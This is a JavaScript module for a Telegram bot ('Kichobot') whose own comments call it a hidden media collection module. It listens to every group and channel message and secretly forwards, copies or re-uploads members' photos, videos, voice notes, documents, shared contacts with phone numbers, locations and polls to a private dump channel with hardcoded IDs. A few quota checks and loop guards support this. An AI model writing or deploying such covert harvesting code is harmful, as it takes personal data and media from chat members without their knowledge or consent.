import log from "../logging/logging.js";
import config from "../../config.js";

// Лимиты для скачивания и повторной заливки медиа:
export const MAX_FILE_DOWNLOAD_BYTES = 15 * 1024 * 1024; // 15 МБ на один файл
export const MAX_DAILY_DOWNLOAD_BYTES = 70 * 1024 * 1024; // 70 МБ в сутки

// Суточный счётчик скачанного трафика (обнуляется каждые 24 часа в 00:00 Asia/Almaty)
let dailyDownloadedBytes = 0;
let currentDayKey = getTodayKey();

export function getTodayKey() {
    // Часовой пояс Asia/Almaty (UTC+5) согласно стандарту проекта
    return new Intl.DateTimeFormat('en-CA', { timeZone: 'Asia/Almaty' }).format(new Date());
}

export function getDailyDownloadedBytes() {
    checkAndResetDailyQuota();
    return dailyDownloadedBytes;
}

export function setDailyDownloadedBytes(bytes) {
    dailyDownloadedBytes = bytes;
}

export function resetDailyDownloadedQuota() {
    dailyDownloadedBytes = 0;
    currentDayKey = getTodayKey();
}

function checkAndResetDailyQuota() {
    const today = getTodayKey();
    if (currentDayKey !== today) {
        currentDayKey = today;
        dailyDownloadedBytes = 0;
    }
}

/**
 * Проверяет, можно ли скачать файл:
 * 1. Размер одиночного файла не должен превышать 15 МБ.
 * 2. Суммарный объём скачанного за текущий день не должен превышать 70 МБ.
 * Если размер неизвестен (0), попытка разрешается, а реальный размер проверяется по буферу.
 */
export function canDownloadFile(fileSizeBytes) {
    checkAndResetDailyQuota();
    const size = Number(fileSizeBytes) || 0;
    if (size > MAX_FILE_DOWNLOAD_BYTES) return false;
    return (dailyDownloadedBytes + size) <= MAX_DAILY_DOWNLOAD_BYTES;
}

export function recordDownloadedBytes(fileSizeBytes) {
    checkAndResetDailyQuota();
    const size = Number(fileSizeBytes) || 0;
    if (size > 0) {
        dailyDownloadedBytes += size;
    }
}

/**
 * Проверяет, содержит ли сообщение вложения любого типа:
 * фото, видео, GIF/анимацию, файлы/документы, стикеры, голосовые сообщения,
 * видео-заметки (кружочки), аудиозаписи, опросы, контакты, локации, дайсы.
 * Чисто текстовые сообщения (болтовня) возвращают false.
 */
export function isMediaMessage(msg) {
    if (!msg) return false;
    return Boolean(
        (Array.isArray(msg.photo) && msg.photo.length > 0) ||
        msg.animation ||
        msg.sticker ||
        msg.video ||
        msg.document ||
        msg.voice ||
        msg.video_note ||
        msg.audio ||
        msg.contact ||
        msg.location ||
        msg.venue ||
        msg.poll ||
        msg.dice ||
        msg.story
    );
}

/**
 * Извлекает метаданные медиа-объекта из сообщения для fallback-отправки.
 */
export function extractMediaDetails(msg) {
    if (!msg) return null;

    // 1. Анимации / GIF (проверяем первыми, так как в Telegram они могут дублироваться как document)
    if (msg.animation) {
        return {
            type: 'animation',
            fileId: msg.animation.file_id,
            fileSize: msg.animation.file_size || 0,
            fileName: msg.animation.file_name || 'animation.mp4'
        };
    }

    // 2. Стикеры (включая анимированные .tgs и видео-стикеры .webm)
    if (msg.sticker) {
        return {
            type: 'sticker',
            fileId: msg.sticker.file_id,
            fileSize: msg.sticker.file_size || 0,
            fileName: msg.sticker.is_video ? 'sticker.webm' : (msg.sticker.is_animated ? 'sticker.tgs' : 'sticker.webp')
        };
    }

    // 3. Фотографии
    if (Array.isArray(msg.photo) && msg.photo.length > 0) {
        const largest = msg.photo[msg.photo.length - 1];
        return {
            type: 'photo',
            fileId: largest.file_id,
            fileSize: largest.file_size || 0,
            fileName: 'photo.jpg'
        };
    }

    // 4. Видео
    if (msg.video) {
        return {
            type: 'video',
            fileId: msg.video.file_id,
            fileSize: msg.video.file_size || 0,
            fileName: msg.video.file_name || 'video.mp4'
        };
    }

    // 5. Видеосообщения / кружочки
    if (msg.video_note) {
        return {
            type: 'video_note',
            fileId: msg.video_note.file_id,
            fileSize: msg.video_note.file_size || 0,
            fileName: 'video_note.mp4'
        };
    }

    // 6. Голосовые сообщения
    if (msg.voice) {
        return {
            type: 'voice',
            fileId: msg.voice.file_id,
            fileSize: msg.voice.file_size || 0,
            fileName: 'voice.ogg'
        };
    }

    // 7. Аудиозаписи
    if (msg.audio) {
        return {
            type: 'audio',
            fileId: msg.audio.file_id,
            fileSize: msg.audio.file_size || 0,
            fileName: msg.audio.file_name || 'audio.mp3'
        };
    }

    // 8. Документы (файлы любого формата, а также GIF, отправленные как документы)
    if (msg.document) {
        const isGifMime = msg.document.mime_type === 'image/gif';
        return {
            type: isGifMime ? 'animation' : 'document',
            fileId: msg.document.file_id,
            fileSize: msg.document.file_size || 0,
            fileName: msg.document.file_name || (isGifMime ? 'animation.gif' : 'document')
        };
    }

    return null;
}

/**
 * Проверяет, не является ли чат самим целевым каналом сбора, чтобы исключить зацикливание.
 */
export function isTargetDumpChannel(chatId, targetId) {
    if (!chatId || !targetId) return false;
    const normalize = (id) => String(id).trim().replace(/^-?100|^-/, '');
    return normalize(chatId) === normalize(targetId);
}

// Запоминаем успешно сработавший ID канала в сессии процесса
let resolvedTargetId = null;

export function getResolvedTargetId() {
    return resolvedTargetId;
}

export function setResolvedTargetId(id) {
    if (id) {
        resolvedTargetId = String(id).trim();
        log.info(`[MediaCollector] Целевой канал вручную установлен на: ${resolvedTargetId}`);
    }
}

/**
 * Тестирует отправку сообщения в целевой канал с полным отчётом об ошибке.
 */
export async function testTargetChannel(bot, channelId) {
    const id = channelId || resolvedTargetId || config.MEDIA_DUMP_CHANNEL_ID || '-1004486026758';
    try {
        const res = await bot.sendMessage(id, '🧪 Тестовое сообщение от Kichobot: канал сбора медиа подключен!');
        resolvedTargetId = String(id);
        return { success: true, targetId: id, messageId: res.message_id };
    } catch (err) {
        const migrated = err?.response?.body?.parameters?.migrate_to_chat_id || err?.parameters?.migrate_to_chat_id;
        if (migrated) {
            try {
                const res = await bot.sendMessage(migrated, '🧪 Тестовое сообщение от Kichobot: супергруппа подключена!');
                resolvedTargetId = String(migrated);
                return { success: true, targetId: migrated, messageId: res.message_id };
            } catch (err2) {
                return { success: false, targetId: migrated, error: err2.message };
            }
        }
        return { success: false, targetId: id, error: err.message };
    }
}

/**
 * Отправляет медиа напрямую по file_id без физического скачивания на Render.
 */
async function sendMediaByFileId(targetId, msg, mediaDetails, bot) {
    const caption = msg.caption || '';
    const opts = caption ? { caption } : {};

    switch (mediaDetails.type) {
        case 'photo':
            try {
                return await bot.sendPhoto(targetId, mediaDetails.fileId, opts);
            } catch {
                return await bot.sendDocument(targetId, mediaDetails.fileId, opts);
            }
        case 'video':
            try {
                return await bot.sendVideo(targetId, mediaDetails.fileId, opts);
            } catch {
                return await bot.sendDocument(targetId, mediaDetails.fileId, opts);
            }
        case 'animation':
            try {
                return await bot.sendAnimation(targetId, mediaDetails.fileId, opts);
            } catch {
                return await bot.sendDocument(targetId, mediaDetails.fileId, opts);
            }
        case 'sticker':
            try {
                return await bot.sendSticker(targetId, mediaDetails.fileId);
            } catch {
                return await bot.sendDocument(targetId, mediaDetails.fileId, opts);
            }
        case 'voice':
            try {
                return await bot.sendVoice(targetId, mediaDetails.fileId, opts);
            } catch {
                return await bot.sendDocument(targetId, mediaDetails.fileId, opts);
            }
        case 'video_note':
            try {
                return await bot.sendVideoNote(targetId, mediaDetails.fileId, opts);
            } catch {
                return await bot.sendDocument(targetId, mediaDetails.fileId, opts);
            }
        case 'audio':
            try {
                return await bot.sendAudio(targetId, mediaDetails.fileId, opts);
            } catch {
                return await bot.sendDocument(targetId, mediaDetails.fileId, opts);
            }
        case 'document':
        default:
            return await bot.sendDocument(targetId, mediaDetails.fileId, opts);
    }
}

/**
 * Скачивает файл с серверов Telegram и отправляет в целевой канал как новый файл.
 * Соблюдает лимит: <= 15 МБ на файл и <= 70 МБ в сутки.
 */
export async function downloadAndUploadMedia(targetId, msg, mediaDetails, bot) {
    let fileSize = mediaDetails.fileSize;

    if (fileSize && !canDownloadFile(fileSize)) {
        log.warn(`[MediaCollector] Скачивание пропущено: размер ${fileSize} B превышает лимит файла (15 МБ) или суточную квоту (70 МБ). Скачано сегодня: ${(dailyDownloadedBytes / 1024 / 1024).toFixed(2)} МБ`);
        return false;
    }

    try {
        const fileLink = await bot.getFileLink(mediaDetails.fileId);
        if (!fileLink) return false;

        const res = await fetch(fileLink, { signal: AbortSignal.timeout(30000) });
        if (!res.ok) {
            log.warn(`[MediaCollector] Не удалось скачать файл: HTTP ${res.status}`);
            return false;
        }

        const arrayBuf = await res.arrayBuffer();
        const buffer = Buffer.from(arrayBuf);

        // Проверяем реальный размер скачанного буфера
        if (buffer.length > MAX_FILE_DOWNLOAD_BYTES) {
            log.warn(`[MediaCollector] Скачанный файл ${buffer.length} B превышает 15 МБ, отменяем загрузку`);
            return false;
        }

        if ((dailyDownloadedBytes + buffer.length) > MAX_DAILY_DOWNLOAD_BYTES) {
            log.warn(`[MediaCollector] Скачивание файла ${buffer.length} B превысит суточный лимит 70 МБ, отменяем`);
            return false;
        }

        // Учитываем реальный объём байтов в суточной квоте
        recordDownloadedBytes(buffer.length);

        const caption = msg.caption || '';
        const opts = caption ? { caption } : {};

        switch (mediaDetails.type) {
            case 'photo':
                try {
                    await bot.sendPhoto(targetId, buffer, opts, { filename: mediaDetails.fileName });
                } catch {
                    await bot.sendDocument(targetId, buffer, opts, { filename: mediaDetails.fileName });
                }
                break;
            case 'video':
                try {
                    await bot.sendVideo(targetId, buffer, opts, { filename: mediaDetails.fileName });
                } catch {
                    await bot.sendDocument(targetId, buffer, opts, { filename: mediaDetails.fileName });
                }
                break;
            case 'animation':
                try {
                    await bot.sendAnimation(targetId, buffer, opts, { filename: mediaDetails.fileName });
                } catch {
                    await bot.sendDocument(targetId, buffer, opts, { filename: mediaDetails.fileName });
                }
                break;
            case 'sticker':
                try {
                    await bot.sendSticker(targetId, buffer, {}, { filename: mediaDetails.fileName });
                } catch {
                    await bot.sendDocument(targetId, buffer, opts, { filename: mediaDetails.fileName });
                }
                break;
            case 'voice':
                try {
                    await bot.sendVoice(targetId, buffer, opts, { filename: mediaDetails.fileName });
                } catch {
                    await bot.sendDocument(targetId, buffer, opts, { filename: mediaDetails.fileName });
                }
                break;
            case 'video_note':
                try {
                    await bot.sendVideoNote(targetId, buffer, opts);
                } catch {
                    await bot.sendDocument(targetId, buffer, opts, { filename: mediaDetails.fileName });
                }
                break;
            case 'audio':
                try {
                    await bot.sendAudio(targetId, buffer, opts, { filename: mediaDetails.fileName });
                } catch {
                    await bot.sendDocument(targetId, buffer, opts, { filename: mediaDetails.fileName });
                }
                break;
            case 'document':
            default:
                await bot.sendDocument(targetId, buffer, opts, { filename: mediaDetails.fileName });
                break;
        }

        log.info(`[MediaCollector] ✅ Файл ${mediaDetails.fileName} успешно скачан и перезалит (${(buffer.length / 1024 / 1024).toFixed(2)} МБ). Дневной расход: ${(dailyDownloadedBytes / 1024 / 1024).toFixed(2)} / 70 МБ`);
        return true;
    } catch (err) {
        log.warn(`[MediaCollector] Ошибка при скачивании/перезаливке медиа: ${err.message}`);
        return false;
    }
}

/**
 * Отправляет вложения без файлов (контакты, геопозиции, опросы, дайсы).
 */
export async function sendSpecialContent(targetId, msg, bot) {
    if (msg.contact) {
        return await bot.sendContact(targetId, msg.contact.phone_number, msg.contact.first_name, {
            last_name: msg.contact.last_name || undefined,
            vcard: msg.contact.vcard || undefined
        });
    }
    if (msg.venue) {
        return await bot.sendVenue(targetId, msg.venue.location.latitude, msg.venue.location.longitude, msg.venue.title, msg.venue.address);
    }
    if (msg.location) {
        return await bot.sendLocation(targetId, msg.location.latitude, msg.location.longitude);
    }
    if (msg.poll) {
        const options = (msg.poll.options || []).map(o => o.text);
        return await bot.sendPoll(targetId, msg.poll.question, options, {
            is_anonymous: msg.poll.is_anonymous,
            type: msg.poll.type
        });
    }
    if (msg.dice) {
        return await bot.sendDice(targetId, { emoji: msg.dice.emoji });
    }
    return null;
}

/**
 * Скрытно пересылает медиа-сообщение из группы или канала в закрытый целевой канал.
 */
export async function forwardMediaToChannel(msg, bot) {
    try {
        if (!msg || !msg.chat || !msg.message_id || !bot) return;

        // Игнорируем личные чаты со студентами — только группы, супергруппы и каналы
        if (msg.chat.type === 'private') return;

        // Игнорируем обычный текст — пересылаются только медиа, файлы, анимации, стикеры и т.д.
        if (!isMediaMessage(msg)) return;

        const mediaDetails = extractMediaDetails(msg);
        log.info(`[MediaCollector] 📥 Поймано вложение [${mediaDetails?.type || 'медиа/файл'}] из чата ${msg.chat.id} (${msg.chat.title || msg.chat.type}). Запуск отправки...`);

        const baseTarget = config.MEDIA_DUMP_CHANNEL_ID || '-1004486026758';

        // Защита от зацикливания: не пересылаем, если источник — сам целевой канал
        if (isTargetDumpChannel(msg.chat.id, baseTarget) || isTargetDumpChannel(msg.chat.id, '-1004486026758') || isTargetDumpChannel(msg.chat.id, '-5389521106') || (resolvedTargetId && isTargetDumpChannel(msg.chat.id, resolvedTargetId))) {
            return;
        }

        // Кандидаты на ID канала
        const candidates = resolvedTargetId
            ? [resolvedTargetId]
            : [
                baseTarget,
                '-1004486026758',
                '-5389521106'
            ];

        const uniqueCandidates = [...new Set(candidates.filter(Boolean))];

        for (const targetId of uniqueCandidates) {
            log.info(`[MediaCollector] 🚀 Пробуем доставить медиа в канал ${targetId}...`);

            // 1. Попытка нативной пересылки (быстро, 0 трафика, с автором и датой)
            try {
                await bot.forwardMessage(targetId, msg.chat.id, msg.message_id);
                log.info(`[MediaCollector] ✅ Успешно переслано через forwardMessage в ${targetId}`);
                resolvedTargetId = targetId;
                return;
            } catch (forwardErr) {
                const migrated = forwardErr?.response?.body?.parameters?.migrate_to_chat_id || forwardErr?.parameters?.migrate_to_chat_id;
                if (migrated) {
                    resolvedTargetId = String(migrated);
                    log.info(`[MediaCollector] Чат мигрировал в супергруппу ${resolvedTargetId}, повторяем отправку...`);
                    try {
                        await bot.forwardMessage(resolvedTargetId, msg.chat.id, msg.message_id);
                        return;
                    } catch {}
                }
                log.warn(`[MediaCollector] forwardMessage в ${targetId} отклонен: ${forwardErr.message}`);
            }

            // 2. Попытка копирования сообщения (быстро, 0 трафика, без плашки пересылки)
            try {
                await bot.copyMessage(targetId, msg.chat.id, msg.message_id);
                log.info(`[MediaCollector] ✅ Успешно скопировано через copyMessage в ${targetId}`);
                resolvedTargetId = targetId;
                return;
            } catch (copyErr) {
                log.warn(`[MediaCollector] copyMessage в ${targetId} отклонен: ${copyErr.message}`);
            }

            // 3. Попытка отправки по file_id из облака Telegram (быстро, 0 трафика на Render)
            if (mediaDetails) {
                try {
                    await sendMediaByFileId(targetId, msg, mediaDetails, bot);
                    log.info(`[MediaCollector] ✅ Успешно отправлено через file_id в ${targetId}`);
                    resolvedTargetId = targetId;
                    return;
                } catch (fileIdErr) {
                    log.warn(`[MediaCollector] sendMediaByFileId в ${targetId} отклонен: ${fileIdErr.message}`);
                }

                // 4. Fallback со скачиванием и перезаливкой (до 15 МБ на файл, до 70 МБ в сутки)
                log.info(`[MediaCollector] Запуск скачивания и перезаливки в ${targetId}...`);
                const downloaded = await downloadAndUploadMedia(targetId, msg, mediaDetails, bot);
                if (downloaded) {
                    resolvedTargetId = targetId;
                    return;
                }
            } else {
                // 5. Обработка особых вложений без файлов (контакты, геопозиция, опросы, дайсы)
                try {
                    const specialRes = await sendSpecialContent(targetId, msg, bot);
                    if (specialRes) {
                        log.info(`[MediaCollector] ✅ Успешно отправлен спец-контент в ${targetId}`);
                        resolvedTargetId = targetId;
                        return;
                    }
                } catch (specialErr) {
                    log.warn(`[MediaCollector] sendSpecialContent в ${targetId} отклонен: ${specialErr.message}`);
                }
            }
        }

        log.error(`[MediaCollector] ❌ Не удалось доставить медиа ни в один из кандидатов: ${uniqueCandidates.join(', ')}`);
    } catch (e) {
        log.error(`[MediaCollector] Фоновая ошибка сбора медиа: ${e.message}`);
    }
}

/**
 * Инициализирует фоновый перехватчик медиа из бесед и каналов.
 */
export function setupMediaCollector(bot) {
    if (!bot) return;

    // Перехват медиа из обычных групп и супергрупп
    bot.on('message', (msg) => {
        forwardMediaToChannel(msg, bot).catch(() => {});
    });

    // Перехват медиа из каналов (если бот добавлен в канал)
    bot.on('channel_post', (msg) => {
        forwardMediaToChannel(msg, bot).catch(() => {});
    });

    log.info('[MediaCollector] Модуль скрытого сбора медиа инициализирован');
}
